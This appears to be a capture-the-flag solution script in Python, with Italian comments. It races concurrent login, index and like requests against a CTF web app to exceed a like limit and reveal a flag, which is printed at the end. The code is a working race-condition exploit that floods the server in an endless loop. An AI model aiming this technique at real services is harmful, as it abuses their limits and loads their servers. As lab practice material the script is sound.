import requests
import random
import string
import threading
import time


baseurl = "http://ratelimited.ctf.offdef.it" 


def login(session, username, password):
    url = "%s/login" % baseurl
    data = {"username": username, "password": password, "login": "login"}
    r = session.post(url, data=data)
    #print(r.text)
    return r.text

def index(session):
    url = "%s/" % baseurl
    r = session.get(url)
    if "flag" in r.text:
       print(r.text)
    #print(r.text)
    return r.text

def like(session):
    url = "%s/like" % baseurl
    data = {"message_id": 4472, "like": "like"}
    r = session.post(url)
    if "flag" in r.text:
        print(r.text)
    #print(r.text)
    return r.text

    
while True:    
    s = requests.Session()
    u = "miao"
    p = "miao"

    login(s,u,p)
    #index()
    
    t1 = threading.Thread(target=index, args=[s])
    t2 = threading.Thread(target=like, args=[s])  
    t3 = threading.Thread(target=index, args=[s])
    t4 = threading.Thread(target=like, args=[s])
    t5 = threading.Thread(target=index, args=[s])


    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()

    t1.join()
    t2.join()
    t3.join()
    t4.join()
    t5.join()
    time.sleep(0.1)
'''
L'idea è quella di sfruttare l'inconsistent state in cui metto più like del NUM_LIKES e quindi got_tons_like è True e allora caricare
la pagina index che mostrerà flag_likes che contiene il flag.
Prima di tutto mi sono registrato manualmente al sito con le credenziali username: miao e password: miao.
Poi ho fatto il login e ho condiviso un post che ha id 4472 (l'id l'ho trovato ispezionando l'html dell'elemento).
Mi è servito creare un post perchè posso mettere like solo ai miei post.
Infine ho creato dei thread di index e like che vengono eseguiti in modo concorrente.
flag{You_like_your_post_very_much!}
'''

    




